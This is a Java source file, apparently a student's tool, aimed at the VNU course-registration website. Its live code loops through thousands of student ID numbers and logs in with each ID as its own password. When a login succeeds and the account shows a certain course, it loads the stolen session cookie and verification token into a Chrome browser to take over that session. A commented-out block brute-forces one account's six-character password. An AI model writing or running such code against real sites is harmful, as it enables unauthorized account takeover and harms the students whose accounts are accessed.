package Console;

import Crawler.CrawlerService;
import org.openqa.selenium.Cookie;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CrackPassword {
    public static void main(String[] args) {
//        CrawlerService crawlerService = new CrawlerService("15021317", "");
//        char[] x = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Y', 'a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y'};
//        for (int i = 0; i < 9; i++) {
//            for (int j = 0; j < 9; j++) {
//                for (int k = 0; k < 9; k++) {
//                    for (int l = 0; l < 9;l++) {
//                        for (int m = 0; m < 9; m++) {
//                            for (int n = 0; n < 9; n++) {
//                                String pass = "" + x[i] + x[j] + x[k] + x[l] + x[m] + x[n];
//                                crawlerService.password = pass;
//                                if(crawlerService.login()) {
//                                    System.out.println("pass : " + pass);
//                                    return;
//                                }
//                                System.out.println("Not true : " + pass);
//                            }
//                        }
//                    }
//                }
//            }
//        }
        System.setProperty("webdriver.chrome.driver", "H:\\sources\\Dangkimonhoc\\src\\chromedriver.exe");
        int i = 16060000;
        boolean a = true;
        SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd");
        String input = args.length == 0 ? "2017-12-12" : args[0];

        Date date = new Date();
        try {
            date = ft.parse(input);
        } catch (ParseException e) {
            System.out.println("Unparseable using " + ft);
        }
        for (; i < 16064000; i++) {
            CrawlerService crawlerService = new CrawlerService(Integer.toString(i), Integer.toString(i));
            System.out.println(i);
            if (crawlerService.login()) {
                System.out.println("cracked: " + crawlerService.request);
                try {
                    String s = crawlerService.getRegisted();
                    if ((s.contains("PES1050"))){
                        WebDriver webDriver2 = new ChromeDriver();
                        webDriver2.get("http://dangkyhoc.vnu.edu.vn/dang-ky-mon-hoc-nganh-1");
                        webDriver2.get("http://dangkyhoc.vnu.edu.vn/dang-ky-mon-hoc-nganh-1");
                        webDriver2.manage().addCookie(new Cookie("ASP.NET_SessionId", crawlerService.asp.substring(18, crawlerService.asp.length()), "/", date));
                        webDriver2.manage().addCookie(new Cookie("__RequestVerificationToken", crawlerService.request.substring("__RequestVerificationToken".length() + 1, crawlerService.request.length()), "vnu.edu.vn", "/", date));
                        webDriver2.get("http://dangkyhoc.vnu.edu.vn/dang-ky-mon-hoc-nganh-1");
                        a = false;
                    }
                } catch (Exception e1) {
                    e1.printStackTrace();
                }
            }
        }
    }
}
